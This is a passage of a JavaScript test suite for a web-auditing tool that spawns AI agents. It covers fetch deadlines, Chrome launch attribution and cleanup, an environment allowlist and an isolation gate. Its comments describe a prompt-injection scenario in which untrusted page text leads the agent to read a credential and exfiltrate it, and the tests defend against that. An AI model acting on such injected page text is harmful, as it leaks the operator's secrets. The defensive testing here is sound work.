    ['bounded:pre-existing-mechanism', /await waitForProcExit|await waitForGroupDrain|port = await new Promise|await close\(\)|await launchChromeOnce|return await fn\(\)/],
    ['bounded:own-deadline', /await waitForNetworkIdle|await waitForInteractEvidence|await Promise\.race|await fetch\(.*AbortSignal|await fetched\.text\(\)|await docPromise/],
    ['bounded:gather-spine', /await launchChrome\(|await newSession\(|await attachConsoleCollector|await session\.close\(\)|await chrome\.close\(\)|await gather\(/],
    ['excluded:page-side-template', /await navigator\./],
    ['excluded:primitive-probe', /await evaluate\(|captureScreenshot|getResponseBody|[Ss]creencast|HeapProfiler|axeSource|axe\.run|Accessibility|Input\.|getCookies|getLayoutMetrics|safeFetch\(|assertPageDerivedFetchAllowed|await lookup\(|await reader\.|res\.body|client\.Runtime\.evaluate|setBypassCSP|setScriptExecutionDisabled|getFullAXTree|await task\(item\)|await Promise\.all\(workers\)|await mapBounded\(|await fn\(session/],
  ];
  const expected = {
    'evidence/cdp.mjs': {
      'bounded:withDeadline': 12,
      'bounded:pre-existing-mechanism': 7,
      'bounded:sleep': 4,
      'bounded:gather-spine': 4,
      'excluded:primitive-probe': 2,
    },
    'evidence/cli.mjs': {
      'bounded:withDeadline': 13,
      'bounded:navigate-helper': 20,
      'bounded:transitive-caller-wraps': 7,
      'bounded:sleep': 22,
      'bounded:own-deadline': 8,
      'bounded:gather-spine': 6,
      'excluded:primitive-probe': 61,
      'excluded:page-side-template': 1,
    },
  };
  for (const [file, expect] of Object.entries(expected)) {
    const lines = readFileSync(join(repoRoot, file), 'utf8').split('\n');
    const counts = {};
    const unmatched = [];
    let total = 0;
    lines.forEach((ln, i) => {
      if (!ln.includes('await ') || ln.trim().startsWith('//')) return;
      total += 1;
      const matches = rules.filter(([, re]) => re.test(ln));
      if (matches.length !== 1) {
        unmatched.push(
          `${file}:${i + 1} [${matches.length === 0 ? 'NO' : matches.length + ' (' + matches.map((m) => m[0]).join(',') + ')'} rule match(es)]: ${ln.trim().slice(0, 100)}`,
        );
        return;
      }
      counts[matches[0][0]] = (counts[matches[0][0]] || 0) + 1;
    });
    assert(
      unmatched.length === 0,
      `await census: ${unmatched.length} await site(s) in ${file} match NO disposition rule - classify them in the census comment next to withDeadline in evidence/cdp.mjs and in this test:\n  ${unmatched.join('\n  ')}`,
    );
    const expectTotal = Object.values(expect).reduce((a, b) => a + b, 0);
    assert(
      total === expectTotal,
      `await census: ${file} has ${total} non-comment await sites but the census expects ${expectTotal} - a site was added or removed without updating the census (testAwaitCensus + the comment next to withDeadline)`,
    );
    for (const [name, n] of Object.entries(expect)) {
      assert(
        (counts[name] || 0) === n,
        `await census: ${file} disposition '${name}' holds ${counts[name] || 0} site(s), expected ${n} - a classification drifted; update the census with the reason`,
      );
    }
  }
}

// THE WHOLE RAW-DERIVED SURFACE, shared by every failure route (web-uplift-17o rev8): three
// revisions each missed a DIFFERENT consumer of the failed fetch, and the third miss (the
// shell verdict) was a value DERIVED from the gated ones rather than a member of them - a
// check that names fields can only catch the fields somebody remembered, and a hand-written
// list per route would repeat that mistake one route at a time. So every route's summary is
// walked the same way: each EMITTED key must be either unknown (null) or on the explicit
// meaningful-without-raw list, with its reason. A key added to the summary later must be
// classified here or the suite fails - the same reason the census is enforced.
// THE GUARANTEE, STATED AT ITS ACTUAL WIDTH: the walk covers top-level keys and the
// immediate members of the raw group. Allowlisted OBJECTS (rendered, screenshots) are NOT
// recursed into - recursing buys little (render facts exist regardless of the raw fetch)
// and a stated guarantee must match what is actually walked, since an over-broad guarantee
// is the same defect as a false value.
function assertUnknownRawSurface(summary, routeLabel, assert) {
  const meaningfulWithoutRaw = new Map([
    ['type', 'the primitive name - a fact about the run'],
    ['url', 'the audited URL - an input fact'],
    ['finalUrl', 'the REQUESTED URL when the exchange failed (it is assigned only once the exchange resolves), the final URL otherwise - a run fact, not a comparison'],
    ['fetchedStatus', 'the recorded status when one arrived (null when none did) - a run fact'],
    ['fetchError', 'the record of the failure - not a claim about the page'],
    ['crawlerUserAgent', 'the user agent used - a run fact'],
    ['rawComparisonUsable', 'the gate itself'],
    ['rawComparisonNote', 'the explanation of why the comparison is absent'],
    ['renderedEmpty', 'describes the RENDER, which exists regardless of the raw fetch'],
    ['rendered', 'rendered-page facts - the render exists regardless of the raw fetch'],
    ['screenshots', 'captured from the render, same reason'],
    ['console', 'what the page logged while rendering - browser-side runtime behavior, exists regardless of the raw fetch (the walk caught this key unclassified on the 404 route, which is the mechanism working)'],
    ['signalsFor', 'static metadata'],
    ['note', 'static documentation'],
  ]);
  const notUnknown = [];
  for (const [k, v] of Object.entries(summary)) {
    if (meaningfulWithoutRaw.has(k)) continue;
    if (k === 'raw') {
      if (v && typeof v === 'object' && Object.values(v).every((x) => x === null)) continue;
      notUnknown.push(`raw=${JSON.stringify(v)}`);
      continue;
    }
    if (v !== null) notUnknown.push(`${k}=${JSON.stringify(v)}`);
  }
  assert(
    notUnknown.length === 0,
    `discoverability (${routeLabel} route): with no raw document, EVERY raw-derived key must be unknown; these are not - null them or classify them with a reason: ${notUnknown.join(', ')}`,
  );
}

// web-uplift-17o rev4: the raw-fetch exchange is bounded AND the bound is configurable, and
// a timed-out raw fetch is never reported as evidence about the page. The slow-but-successful
// control only passes because the budget was raised - a fixed bound would be a product
// regression (a slow response recorded as a fetch error, then an empty raw document compared
// against the rendered page, manufacturing a JS-shell signal from a network condition).
async function testFetchDeadlineAndRawComparison() {
  const { safeFetch, readBodyCapped, configureFetchDeadline } = await import(
    pathToFileURL(join(repoRoot, 'evidence/cli.mjs')).href
  );

  const slow = http.createServer((req, res) => {
    setTimeout(() => {
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end('<!doctype html><title>slow</title><h1>Slow Canary Heading</h1><p>slow but successful content, present in the raw document</p>');
    }, 800);
  });
  await new Promise((r) => slow.listen(0, '127.0.0.1', r));
  const slowUrl = `http://127.0.0.1:${slow.address().port}/`;
  const slowOrigin = new URL(slowUrl).origin;

  const stallBody = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.write('<!doctype html><title>stall</title>');
    // never ends the body
  });
  await new Promise((r) => stallBody.listen(0, '127.0.0.1', r));
  const stallUrl = `http://127.0.0.1:${stallBody.address().port}/`;
  const stallOrigin = new URL(stallUrl).origin;

  try {
    // 1. THE BOUND: a 200ms budget against an 800ms server fails loudly,
    let fastErr = null;
    try {
      await safeFetch(slowUrl, { targetOrigin: slowOrigin, deadlineMs: 200 });
    } catch (e) {
      fastErr = e;
    }
    assert(fastErr, 'fetch deadline: a slow response under a small budget must fail rather than hang');
    // 2. ...and the SAME fetch under a raised budget SUCCEEDS. WHAT THIS DEMONSTRATES,
    //    stated narrowly: the budget override is APPLIED and effective at a small scale
    //    (800ms server vs 200ms/5000ms budgets). What it does NOT demonstrate: a response
    //    exceeding the PRODUCTION default (30s) remaining usable when an operator raises
    //    the budget - exercising that literally would need a response slower than the
    //    default, which does not belong in a suite. Say what was demonstrated.
    const raised = await safeFetch(slowUrl, { targetOrigin: slowOrigin, deadlineMs: 5000 });
    const raisedText = await raised.text();
    assert(
      raisedText.includes('Slow Canary Heading'),
      `fetch deadline: a slow-but-successful response must arrive intact under a raised budget (${raisedText.length} chars)`,
    );

    // 3. STALLED BODY: headers arrive, the body never does -> the read times out loudly.
    const stalled = await safeFetch(stallUrl, { targetOrigin: stallOrigin, deadlineMs: 1500 });
    let bodyErr = null;
    try {
      await stalled.text();
    } catch (e) {
      bodyErr = e;
    }
    assert(
      bodyErr && bodyErr.message.includes('did not complete within'),
      `fetch deadline: a stalled body must fail loudly, naming the bound (${bodyErr && bodyErr.message})`,
    );

    // 4. STALLED CANCELLATION: a reader whose read() AND cancel() never resolve. The timeout
    //    must throw WITHOUT awaiting the cancellation - cleanup awaited after a deadline is
    //    how a bounded operation still hangs (the rev2 class, one layer down).
    const neverReader = { read: () => new Promise(() => {}), cancel: () => new Promise(() => {}) };
    const mockRes = { body: { getReader: () => neverReader } };
    const t0 = Date.now();
    let cancelErr = null;
    try {
      await readBodyCapped(mockRes, 1024 * 1024, 150);
    } catch (e) {
      cancelErr = e;
    }
    const cancelElapsed = Date.now() - t0;
    assert(
      cancelErr && cancelErr.message.includes('did not complete within 150ms'),
      `fetch deadline: a stalled read must fail loudly (${cancelErr && cancelErr.message})`,
    );
    assert(
      cancelElapsed < 3000,
      `fetch deadline: the throw must NOT await a stalled cancellation (${cancelElapsed}ms)`,
    );

    // 5. THE DISTINCTION, end to end: a discoverability run whose raw fetch times out must
    //    record the comparison as NOT USABLE - a timeout is a network condition, never
    //    evidence that the page lacked raw content.
    configureFetchDeadline(400); // the server answers at 800ms: the raw fetch times out
    const timed = await gather('discoverability', slowUrl, { quiet: true, wait: 300, screenshots: false });
    assert(timed && timed.fetchError, `discoverability: the timed-out raw fetch must be recorded as an error (${JSON.stringify(timed && { fetchError: timed.fetchError })})`);
    assert(timed.rawComparisonUsable === false, 'discoverability: the gate itself must be false when the raw fetch failed');
    assert(
      typeof timed.rawComparisonNote === 'string' && timed.rawComparisonNote.includes('network condition'),
      'discoverability: the summary must SAY the comparison is not evidence about the page',
    );
    assertUnknownRawSurface(timed, 'timeout', assert);

    // 6a. THE NON-2XX ROUTE: a 404 page is a response ABOUT the resource, not the document
    //     - the gate must not treat it as usable, and the STATUS is still recorded, so the
    //     operator sees the 404 as a status rather than as a misleading "not a JS shell".
    const nf = http.createServer((req, res) => {
      res.writeHead(404, { 'Content-Type': 'text/html' });
      res.end('<!doctype html><title>Not Found</title><h1>404</h1>');
    });
    await new Promise((r) => nf.listen(0, '127.0.0.1', r));
    const nfSummary = await gather('discoverability', `http://127.0.0.1:${nf.address().port}/`, { quiet: true, wait: 300, screenshots: false });
    assert(
      nfSummary.rawComparisonUsable === false &&
        nfSummary.fetchedStatus === 404 &&
        typeof nfSummary.rawComparisonNote === 'string' &&
        nfSummary.rawComparisonNote.includes('404'),
      `discoverability: a non-2xx must be unusable with the status recorded and named (${JSON.stringify({ usable: nfSummary.rawComparisonUsable, status: nfSummary.fetchedStatus })})`,
    );
    assertUnknownRawSurface(nfSummary, 'non-2xx', assert);
    nf.close();

    // 6a-ii. THE BODY-READ ROUTE, end to end: the SAME server cannot stall the raw fetch
    //        and serve the browser (a uniformly stalling body also hangs the navigation -
    //        correct, but a different route), so split by user agent: the crawler fetch
    //        stalls mid-body and the budget fires; the browser gets a complete page. The
    //        summary gets the same whole-surface guard, not a hand-written field list.
    const bodyStall = http.createServer((req, res) => {
      if ((req.headers['user-agent'] || '').includes('web-uplift-discoverability')) {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.write('<!doctype html><title>crawler-half</title>');
        return; // never ends the body for the raw fetch
      }
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end('<!doctype html><title>Browser Half</title><h1>Browser Half Heading</h1><p>complete for the browser</p>');
    });
    await new Promise((r) => bodyStall.listen(0, '127.0.0.1', r));
    configureFetchDeadline(400);
    const stalledSummary = await gather('discoverability', `http://127.0.0.1:${bodyStall.address().port}/`, { quiet: true, wait: 300, screenshots: false });
    assert(
      stalledSummary.rawComparisonUsable === false && typeof stalledSummary.fetchError === 'string',
      `discoverability: a body-read failure must be unusable with the error recorded (${JSON.stringify({ usable: stalledSummary.rawComparisonUsable, fetchError: stalledSummary.fetchError && stalledSummary.fetchError.slice(0, 60) })})`,
    );
    assertUnknownRawSurface(stalledSummary, 'body-read', assert);
    bodyStall.close();

    // 6b. THE EMPTY-200 ROUTE STAYS USABLE: a completed empty response is OBSERVED evidence
    //     that the raw document was empty - the real empty-document signal the tool exists
    //     to report, deliberately distinct from "not retrieved".
    const empty = http.createServer((req, res) => {
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end('');
    });
    await new Promise((r) => empty.listen(0, '127.0.0.1', r));
    const emptySummary = await gather('discoverability', `http://127.0.0.1:${empty.address().port}/`, { quiet: true, wait: 300, screenshots: false });
    assert(
      emptySummary.rawComparisonUsable === true && emptySummary.fetchedStatus === 200 && emptySummary.raw.htmlBytes === 0,
      `discoverability: an empty 200 must stay usable with the emptiness observed (${JSON.stringify({ usable: emptySummary.rawComparisonUsable, status: emptySummary.fetchedStatus, raw: emptySummary.raw })})`,
    );
    empty.close();

    // 6c. THE RAISED-BUDGET CONTROL, end to end: the same page with the budget raised yields
    //    a real comparison - this passes only because the budget is configurable.
    configureFetchDeadline(5000);
    const ok = await gather('discoverability', slowUrl, { quiet: true, wait: 300, screenshots: false });
    assert(
      ok.rawComparisonUsable === true &&
        ok.coveragePct !== null &&
        ok.isJsShell === false &&
        ok.titlePresentInRaw === true &&
        ok.h1PresentInRaw === true &&
        Array.isArray(ok.emptyMounts) &&
        ok.raw.htmlBytes > 0,
      `discoverability: with the budget raised, the slow-but-successful page must compare for real, siblings included (${JSON.stringify({ coveragePct: ok.coveragePct, isJsShell: ok.isJsShell, rawComparisonUsable: ok.rawComparisonUsable, titlePresentInRaw: ok.titlePresentInRaw, h1PresentInRaw: ok.h1PresentInRaw, emptyMounts: ok.emptyMounts, raw: ok.raw })})`,
    );
  } finally {
    configureFetchDeadline(30000); // restore the production default for the rest of the suite
    slow.close();
    stallBody.close();
  }
}

// Launch-time attribution (web-uplift-4wx): a primitive still IN FLIGHT when the
// job dies leaves no result artifact, and the browser's profile/pid only ever
// reached the caller's stderr stream — so a surviving or orphaned chrome could
// not be tied to the invocation that launched it. With WEB_UPLIFT_LAUNCH_LOG
// set (the batch runner points it at <run dir>/launches.jsonl for every agent
// child), the CLI appends a marker AT LAUNCH. This test is the bead's
// acceptance control, run for real: a primitive against a server that never
// responds is killed EXTERNALLY mid-flight, and the launches.jsonl line alone
// must attribute it — and is then USED to reap the browser, which is the
// post-mortem flow the file exists for. The CLI runs as a child (async spawn,
// never spawnSync: the in-process server must keep answering).
async function testLaunchAttributionForHungPrimitive() {
  const hung = http.createServer(() => {
    // accepts and never responds: the navigation stays in flight
  });
  await new Promise((r) => hung.listen(0, '127.0.0.1', r));
  const hungUrl = `http://127.0.0.1:${hung.address().port}/`;
  const runTmp = mkdtempSync(join(tmpdir(), 'web-uplift-launches-'));
  const launchesFile = join(runTmp, 'launches.jsonl');
  const outFile = join(runTmp, 'out.json');

  const child = spawn(
    process.execPath,
    [join(repoRoot, 'evidence/cli.mjs'), 'dom', hungUrl, '--out', outFile],
    {
      cwd: repoRoot,
      env: { ...process.env, WEB_UPLIFT_LAUNCH_LOG: launchesFile },
      stdio: ['ignore', 'pipe', 'pipe'],
    },
  );
  let childStderr = '';
  child.stderr.on('data', (chunk) => { childStderr += chunk; });
  const childGone = new Promise((r) => child.on('close', r));

  const killTree = (pid) => {
    // chrome leads its own process group (detached): signal the whole tree.
    try { process.kill(-pid, 'SIGKILL'); } catch { /* already gone */ }
    try { process.kill(pid, 'SIGKILL'); } catch { /* already gone */ }
  };

  // Track the browser OUTSIDE the success path: any assertion failure below
  // (including the mutation controls that prove this test can fail) must still
  // reap the chrome, or a red run leaks an orphaned browser for the reaper -
  // observed for real on 2026-10-06, when a pid-nulled mutant threw at the
  // field asserts and left /tmp/web-uplift-cdp-* alive until the reaper's
  // 10-minute orphan rule killed it. The marker's own fields are the FIRST
  // source, but cleanup must not DEPEND on marker content: a marker with a
  // nulled pid is exactly the mutation this test uses, so the finally also
  // discovers the browser directly, as the chrome child of the CLI process we
  // spawned (chrome is spawned by the CLI, then detached into its own group).
  let browserPid = null;
  let browserProfile = null;
  const findLaunchedChrome = () => {
    for (const entry of readdirSync('/proc')) {
      if (!/^\d+$/.test(entry)) continue;
      try {
        const stat = readFileSync(`/proc/${entry}/stat`, 'utf8');
        const ppid = Number(stat.slice(stat.lastIndexOf(')') + 1).trim().split(/\s+/)[1]);
        if (ppid !== child.pid) continue;
        const cmdline = readFileSync(`/proc/${entry}/cmdline`, 'utf8');
        if (cmdline.includes('web-uplift-cdp-')) return Number(entry);
      } catch { /* process vanished mid-scan */ }
    }
    return null;
  };

  try {
    // Wait for the LAUNCH-TIME record (bounded; chrome launch on a loaded box
    // can take seconds). The marker must appear while the primitive is hung —
    // if it only ever appeared at completion, this poll would time out.
    let record = null;
    const deadline = Date.now() + 90000;
    while (Date.now() < deadline && !record) {
      if (child.exitCode !== null) {
        throw new Error(`the CLI exited before any launch marker landed: ${childStderr}`);
      }
      if (existsSync(launchesFile)) {
        const line = readFileSync(launchesFile, 'utf8').trim().split('\n').filter(Boolean)[0];
        if (line) {
          record = JSON.parse(line);
          // Track for the finally's cleanup the moment the marker exists,
          // BEFORE any assert can throw (a malformed marker still names a
          // real browser).
          if (Number.isInteger(record.pid)) browserPid = record.pid;
          if (typeof record.profileDir === 'string') browserProfile = record.profileDir;
        }
      }
      if (!record) await new Promise((r) => setTimeout(r, 250));
    }
    assert(record, `no launch marker within 90s; launches.jsonl attribution is absent (child stderr: ${childStderr.slice(-400)})`);
    assert(record.primitive === 'dom', `the marker must name the primitive: ${JSON.stringify(record)}`);
    assert(record.url === hungUrl, `the marker must name the target: ${JSON.stringify(record)}`);
    assert(Number.isInteger(record.pid) && record.pid > 0, `the marker must carry the browser pid (the reaper kills by tree): ${JSON.stringify(record)}`);
    assert(
      typeof record.profileDir === 'string' && record.profileDir.includes('web-uplift-cdp-'),
      `the marker must carry the profile dir: ${JSON.stringify(record)}`,
    );
    assert(record.launcherPid === child.pid, `the marker must tie back to the invoking process: ${JSON.stringify(record)} vs child ${child.pid}`);
    // THE POINT: attribution exists with NO completion artifact - the hung
    // primitive never wrote its result.
    assert(!existsSync(outFile), 'the hung primitive must have written no result artifact, or this test proves nothing about in-flight attribution');

    // THE POST-MORTEM FLOW: the record alone is enough to find and reap the
    // browser the dead job left behind.
    killTree(record.pid);
    child.kill('SIGKILL');
    await childGone;
    // A SIGKILLed pid can answer kill(pid, 0) until it is reaped, so wait
    // (bounded) for it to actually vanish rather than racing the zombie.
    let reaped = false;
    for (let i = 0; i < 40 && !reaped; i++) {
      try { process.kill(record.pid, 0); } catch { reaped = true; }
      if (!reaped) await new Promise((r) => setTimeout(r, 250));
    }
    assert(reaped, `the browser named by the marker (${record.pid}) must be reaped via the marker's pid`);
    rmSync(record.profileDir, { recursive: true, force: true });
    browserPid = null; // reaped and verified above; the finally must not kill again.
    // browserProfile STAYS SET: the group kill does not reach the crashpad
    // handler (it double-forks out of the group - the reaper took one such
    // remnant from a GREEN run of this test at 10 min), so the finally's
    // profile-path sweep must run on the success path too. The repeated rmSync
    // is idempotent (force: true).
  } finally {
    child.kill('SIGKILL');
    if (!browserPid) browserPid = findLaunchedChrome();
    // Resolve the profile BEFORE killing: a dead browser's cmdline is gone.
    if (!browserProfile && browserPid) {
      try {
        const cmdline = readFileSync(`/proc/${browserPid}/cmdline`, 'utf8');
        const m = /(\/tmp\/web-uplift-cdp-[^\0\s]+)/.exec(cmdline);
        if (m) browserProfile = m[1];
      } catch { /* already reaped */ }
    }
    if (browserPid) killTree(browserPid);
    // chrome's crashpad handler is NOT in the browser's process group (it
    // double-forks), so the group kill leaves it behind and the reaper takes
    // it at 10 min - observed 2026-10-06. Sweep by the unique profile path,
    // which only this launch's processes carry. (Never pkill -f from a shell:
    // the pattern appears in the shell's own cmdline.)
    if (browserProfile) {
      for (const entry of readdirSync('/proc')) {
        if (!/^\d+$/.test(entry)) continue;
        try {
          if (readFileSync(`/proc/${entry}/cmdline`, 'utf8').includes(browserProfile)) {
            try { process.kill(Number(entry), 'SIGKILL'); } catch { /* gone */ }
          }
        } catch { /* process vanished mid-scan */ }
      }
      rmSync(browserProfile, { recursive: true, force: true });
    }
    hung.close();
    rmSync(runTmp, { recursive: true, force: true });
  }
}

// Operator-path launch attribution (web-uplift-6x7): the flow record/replay
// subcommands launch chrome too, and a failed launch attempt used to record
// nothing at all. Both now write the same launches.jsonl marker.
async function testOperatorLaunchAttribution() {
  const runTmp = mkdtempSync(join(tmpdir(), 'web-uplift-flow-launch-'));
  const launchesFile = join(runTmp, 'launches.jsonl');
  try {
    // 1. THE OPERATOR PATH: `flow replay` launches chrome through the same
    //    recordLaunch the agent-run primitives use. A zero-step flow keeps
    //    this cheap: launch, attribute, close (the child's own finally).
    const flowPath = join(runTmp, 'flow.json');
    writeFileSync(flowPath, JSON.stringify({ title: 'empty', steps: [] }));
    const replay = await runAsync(
      process.execPath,
      [join(repoRoot, 'runner/flow.mjs'), 'replay', flowPath, '--url', 'https://example.com', '--out', join(runTmp, 'evidence')],
      { env: { ...process.env, WEB_UPLIFT_LAUNCH_LOG: launchesFile } },
    );
    assert(replay.status === 0, `flow replay must succeed: ${replay.stderr}`);
    assert(existsSync(launchesFile), `flow replay must write a launch marker to WEB_UPLIFT_LAUNCH_LOG; none exists (replay stderr: ${replay.stderr.slice(-300)})`);
    const lines = readFileSync(launchesFile, 'utf8').trim().split('\n').filter(Boolean).map((l) => JSON.parse(l));
    const replayMark = lines.find((l) => l.primitive === 'flow-replay');
    assert(replayMark, `flow replay must be attributed in launches.jsonl: ${lines.map((l) => JSON.stringify(l)).join(' | ')}`);
    assert(
      replayMark.outcome === 'launched' && Number.isInteger(replayMark.pid) && replayMark.profileDir.includes('web-uplift-cdp-'),
      `the operator marker must look like every other launch marker: ${JSON.stringify(replayMark)}`,
    );

    // 2. THE FAILED LAUNCH: an attempt that dies before the DevTools endpoint
    //    records what it knew - pid, profile, reason - with outcome 'failed'.
    //    A 50ms devtools budget forces the failure against real chrome (real
    //    boots take hundreds of ms); the attempt's own close() reaps the tree,
    //    so nothing here leaks.
    process.env.WEB_UPLIFT_LAUNCH_LOG = launchesFile;
    let launchErr = null;
    try {
      await launchChrome({ log: () => {}, devtoolsTimeoutMs: 50 });
    } catch (e) {
      launchErr = e;
    } finally {
      delete process.env.WEB_UPLIFT_LAUNCH_LOG;
    }
    assert(launchErr, 'a 50ms devtools budget must fail the launch');
    const failedMarks = readFileSync(launchesFile, 'utf8')
      .trim().split('\n').filter(Boolean).map((l) => JSON.parse(l))
      .filter((l) => l.outcome === 'failed');
    assert(failedMarks.length > 0, 'a failed launch attempt must be recorded in launches.jsonl');
    const fm = failedMarks[failedMarks.length - 1];
    assert(Number.isInteger(fm.pid) && fm.pid > 0, `the failed attempt must record the pid it created: ${JSON.stringify(fm)}`);
    assert(
      typeof fm.reason === 'string' && fm.reason.includes('timed out'),
      `the failed attempt must record why it died: ${JSON.stringify(fm)}`,
    );
  } finally {
    delete process.env.WEB_UPLIFT_LAUNCH_LOG;
    rmSync(runTmp, { recursive: true, force: true });
  }
}

// The agent-child environment allowlist (web-uplift-l6d): the spawned agent
// ingests untrusted page text with network egress, so it must NOT inherit the
// operator's shell env - a page that talks the agent into reading a credential
// can exfiltrate it. The child gets an explicit allowlist instead, sensitive
// withholdings are warned on BY NAME (never values), and --agent-env is the
// explicit opt-in.
async function testAgentChildEnvAllowlist() {
  const { buildAgentEnv, parseAgentEnvFlag } = await import(pathToFileURL(join(repoRoot, 'runner/agents.mjs')).href);

  // 1. UNIT: what passes, what is withheld, what is warned.
  const warnings = [];
  const fakeEnv = {
    PATH: '/usr/bin', HOME: '/home/op', LANG: 'en_GB.UTF-8',
    ANTHROPIC_API_KEY: 'sk-ant-secret', OPENAI_API_KEY: 'sk-openai-secret', GEMINI_API_KEY: 'gemini-secret',
    WEB_UPLIFT_FETCH_DEADLINE_MS: '5000',
    GITHUB_TOKEN: 'ghp_secret', AWS_SECRET_ACCESS_KEY: 'aws-secret',
    SSH_AUTH_SOCK: '/tmp/ssh-agent', NPM_TOKEN: 'npm-secret', RANDOM_NOISE: 'harmless',
  };
  const built = buildAgentEnv({ env: fakeEnv, warn: (m) => warnings.push(m) });
  for (const kept of ['PATH', 'HOME', 'LANG', 'ANTHROPIC_API_KEY', 'WEB_UPLIFT_FETCH_DEADLINE_MS']) {
    assert(built[kept] === fakeEnv[kept], `the child needs ${kept}: it must pass the allowlist`);
  }
  for (const dropped of ['GITHUB_TOKEN', 'AWS_SECRET_ACCESS_KEY', 'SSH_AUTH_SOCK', 'NPM_TOKEN', 'RANDOM_NOISE']) {
    assert(built[dropped] === undefined, `${dropped} must NOT reach the agent child`);
  }
  assert(warnings.length === 1, `withheld variables must be warned on once: ${JSON.stringify(warnings)}`);
  for (const named of ['GITHUB_TOKEN', 'AWS_SECRET_ACCESS_KEY', 'SSH_AUTH_SOCK', 'NPM_TOKEN']) {
    assert(warnings[0].includes(named), `the warning must name the withheld ${named}: ${warnings[0]}`);
  }
  assert(
    !warnings[0].includes('ghp_secret') && !warnings[0].includes('aws-secret'),
    'the warning must name variables but NEVER carry their values',
  );
  assert(!warnings[0].includes('RANDOM_NOISE'), 'a harmless variable is dropped silently; only sensitive-looking ones are named');

  // 1b. PROVIDER SCOPING (web-uplift-5ta): a claude run gets the ANTHROPIC_
  //     family ONLY - an operator's OPENAI_/GEMINI_ keys are withheld from it;
  //     no agentName falls back to the broad union so an unmapped CLI never
  //     silently loses the credential it needs.
  const claudeBuilt = buildAgentEnv({ agentName: 'claude', env: fakeEnv, warn: () => {} });
  assert(claudeBuilt.ANTHROPIC_API_KEY === 'sk-ant-secret', 'a claude child keeps its own provider family');
  assert(claudeBuilt.OPENAI_API_KEY === undefined, 'a claude child must NOT receive OPENAI_API_KEY');
  assert(claudeBuilt.GEMINI_API_KEY === undefined, 'a claude child must NOT receive GEMINI_API_KEY');
  const broadBuilt = buildAgentEnv({ env: fakeEnv, warn: () => {} });
  assert(
    broadBuilt.OPENAI_API_KEY === 'sk-openai-secret' && broadBuilt.GEMINI_API_KEY === 'gemini-secret',
    'no agentName falls back to the broad provider union (the l6d behaviour)',
  );

  // 2. --agent-env parsing: explicit additions win, values may contain '=', bad
  //    shapes are rejected loudly.
  const extra = parseAgentEnvFlag(['COPILOT_GITHUB_TOKEN=ghp_scoped', 'WEIRD=a=b=c']);
  assert(extra.COPILOT_GITHUB_TOKEN === 'ghp_scoped' && extra.WEIRD === 'a=b=c', `--agent-env parsing: ${JSON.stringify(extra)}`);
  const withExtra = buildAgentEnv({ env: fakeEnv, extra, warn: () => {} });
  assert(withExtra.COPILOT_GITHUB_TOKEN === 'ghp_scoped', 'an --agent-env addition must reach the child');
  for (const bad of ['NOEQUALS', '=x', '1BAD=x', 'BAD-NAME=x']) {
    let threw = false;
    try { parseAgentEnvFlag([bad]); } catch { threw = true; }
    assert(threw, `--agent-env must reject ${JSON.stringify(bad)}`);
  }

  // 3. THE SPAWN SEAM, end to end: a stub agent records the environment it
  //    ACTUALLY received from the batch runner, proving the child gets the
  //    allowlist and nothing else - including the run-level launches.jsonl
  //    path, which is runner-set on top of the allowlist (4wx).
  const envTmp = mkdtempSync(join(tmpdir(), 'web-uplift-agent-env-'));
  try {
    const captureFile = join(envTmp, 'child-env-keys.txt');
    const binDir = join(envTmp, 'bin');
    mkdirSync(binDir);
    const stubPath = join(binDir, 'claude');
    writeFileSync(stubPath, `#!/bin/sh\nenv | cut -d= -f1 | sort > ${captureFile}\nexit 0\n`);
    chmodSync(stubPath, 0o755);
    const run = await runAsync(
      process.execPath,
      [join(repoRoot, 'runner', 'run-batch.mjs'), 'https://example.com', '--agent', 'claude', '--isolation', 'test-suite', '--out', join(envTmp, 'reports')],
      {
        env: {
          PATH: `${binDir}:${process.env.PATH}`,
          HOME: envTmp,
          GITHUB_TOKEN: 'ghp_parent_secret',
          ANTHROPIC_API_KEY: 'sk-ant-parent',
          OPENAI_API_KEY: 'sk-openai-parent',
          SSH_AUTH_SOCK: '/tmp/ssh-parent',
        },
      },
    );
    assert(existsSync(captureFile), `the stub agent must have run (runner stderr: ${run.stderr.slice(-400)})`);
    const childKeys = readFileSync(captureFile, 'utf8').trim().split('\n');
    assert(childKeys.includes('ANTHROPIC_API_KEY'), 'the child keeps its own provider credential');
    assert(childKeys.includes('PATH') && childKeys.includes('HOME'), 'the child keeps PATH/HOME');
    assert(childKeys.includes('WEB_UPLIFT_LAUNCH_LOG'), 'the run-level launches path must reach the child (4wx)');
    for (const dropped of ['GITHUB_TOKEN', 'SSH_AUTH_SOCK']) {
      assert(!childKeys.includes(dropped), `the operator's ${dropped} must NOT reach the agent child`);
    }
    assert(!childKeys.includes('OPENAI_API_KEY'), 'a claude spawn must NOT receive OPENAI_API_KEY (provider scoping, 5ta)');
    assert(
      run.stderr.includes('withheld') && run.stderr.includes('GITHUB_TOKEN'),
      `the runner must warn the withheld names on stderr: ${run.stderr.slice(-400)}`,
    );
  } finally {
    rmSync(envTmp, { recursive: true, force: true });
  }
}

// The batch isolation gate (web-uplift-odx): the batch runner drives the SAME
// write-capable, prompt-injectable agent as fix mode, so it must refuse to
// spawn until the operator names a boundary - or explicitly acknowledges none -
// exactly like the fixer. A stub agent on PATH proves whether a spawn happened.
async function testBatchIsolationGate() {
  const isoTmp = mkdtempSync(join(tmpdir(), 'web-uplift-isolation-'));
  try {
    const captureFile = join(isoTmp, 'spawned.txt');
    const binDir = join(isoTmp, 'bin');
    mkdirSync(binDir);
    const stubPath = join(binDir, 'claude');
    writeFileSync(stubPath, `#!/bin/sh\ntouch ${captureFile}\nexit 0\n`);
    chmodSync(stubPath, 0o755);
    const baseEnv = { PATH: `${binDir}:${process.env.PATH}`, HOME: isoTmp };
    const driveBatch = (extra) =>
      runAsync(process.execPath, [join(repoRoot, 'runner', 'run-batch.mjs'), 'https://example.com', '--agent', 'claude', ...extra], { env: baseEnv });

    // 1. NO ASSERTION: refused BEFORE any spawn, exit 1, stderr names the
    //    contract, the refusal is recorded, the stub never ran.
    const refused = await driveBatch(['--out', join(isoTmp, 'r1')]);
    assert(refused.status === 1, `no assertion must refuse with exit 1: ${refused.status} ${refused.stderr.slice(-200)}`);
